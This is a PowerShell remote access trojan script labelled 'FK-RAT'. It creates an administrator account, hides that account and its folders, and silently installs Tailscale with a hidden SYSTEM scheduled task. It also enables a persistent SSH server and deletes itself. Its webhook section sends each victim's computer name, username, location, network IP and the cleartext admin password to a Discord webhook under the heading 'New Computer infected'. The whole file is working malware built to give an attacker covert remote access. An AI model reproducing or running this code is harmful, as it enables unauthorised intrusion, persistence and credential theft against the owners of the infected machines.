## Create random text (8 letters)
function randomText {
  return -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
}

## Create Local Admin FUNCTION
function createAdmin {
  param (
    [string] $uName,
    [securestring] $pWord
  )
  begin{
  }
  process {
    New-LocalUser "$uName" -Password $pWord -FullName "$uName" -Description "Temporary local admin"
    Write-Verbose "$uName local user crated"
    Add-LocalGroupMember -Group "$group" -Member "$uName"
    Write-Verbose "$uName added to the local administrator group"
  }
  end{
  }
}

function installTailscale {
  param ([string] $authKey, [string] $path)

  ## CD to Temp
  Set-Location $path

  ## Download and install tailnet
  Invoke-Webrequest -Uri https://pkgs.tailscale.com/stable/tailscale-setup-1.50.1-amd64.msi -OutFile file.msi
  msiexec.exe /a file.msi /quiet

  ## Hide Tailnet folder in C
  Get-Item "C:\tailscale" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}

  ## Configure Tailscale on users pc

  Write-Output "Set-Location C:\tailscale
Start-Process -FilePath '.\tailscaled.exe' -WindowStyle Hidden
Start-Process -FilePath '.\tailscale.exe'  -WindowStyle Hidden -ArgumentList 'up --authkey $authKey'" >> tailscale.ps1
  Start-Process tailscale.ps1 -WindowStyle Hidden

  $name = "Tailscale"
  $action = New-ScheduledTaskAction -Execute "tailscale.ps1" -WorkingDirectory "C:\Tailscale\"
  $trigger = New-ScheduledTaskTrigger -AtLogOn
  $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highes
  $settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable -WakeToRun

  if (Get-ScheduledTask $name -ErrorAction SilentlyContinue) {Unregister-ScheduledTask $name} 
  Register-ScheduledTask -TaskName $name -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Tailscale Service, Preinstalled for Windoes"
}


## Temp Directory
## variables
$temp = "$env:temp"
$dirName = randomText
$pWordClear = randomText
$pWord = (ConvertTo-SecureString  $pWordClear -AsPlainText -Force)
$uName = "fkrat"
$rPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
$group = (((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value) -Split "\\")[1]
$Webhook = Get-Content ./webhook
$authKey = Get-Content ./authKey
$language = (Get-WinUserLanguageList)[0].autonym
$country = ((((Get-WinHomeLocation)[0] | Select-Object HomeLocation) | ConvertTo-Json -Compress -Depth 100)[17..300] -join '') 
$country = $country.Substring(0, $country.length - 2)


## Create Admin
createAdmin -uName $uName -pWord $pWord

## Hide FK-RAT User (Admin)
New-Item -Path $rPath -Force
New-ItemProperty -Path $rPath -Name $uName -Value 00000000
timeout 2
Get-Item "C:\Users\$uName" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}

## goto Temp and make dir
Set-Location $temp	
New-Item -Path $temp -Name $dirName -Type Directory
Set-Location $dirName

## Install Tailscale and take ip
installTailscale -authKey $authKey -path $temp/$dirName 
$ip = (Get-NetIPAddress -AddressFamily IPv4 -AddressState Preferred -InterfaceAlias "Tailscale").IPAddress 
Set-Location $PSScriptRoot

## Sends Discord Webhook
$description = 
"New Computer infected 
---------------------------------
Computer Name = $env:computername 
User Name = $env:username
Computer Language = $language
Location (country) = $country
IP = $ip
Account Password = $pwordClear"
New-Item ./$env:computername.fk -Value ( $ip,$pwordClear,"C:/Users/$uName","Ignore this file if you aren't familiar with Network Statistics" -join [Environment]::NewLine + [Environment]::NewLine )
$payload = [PSCustomObject]@{content=$description}
Invoke-RestMethod -Uri $Webhook -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json';
curl.exe -F "file1=@./$env:computername.fk" $Webhook

## Enable persistent SSH
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

## Self Delete
Remove-Item "$PSScriptRoot/$env:computername.fk" 
Remove-Item "$PSScriptRoot/webhook"
Remove-Item $PSCommandPath -Force 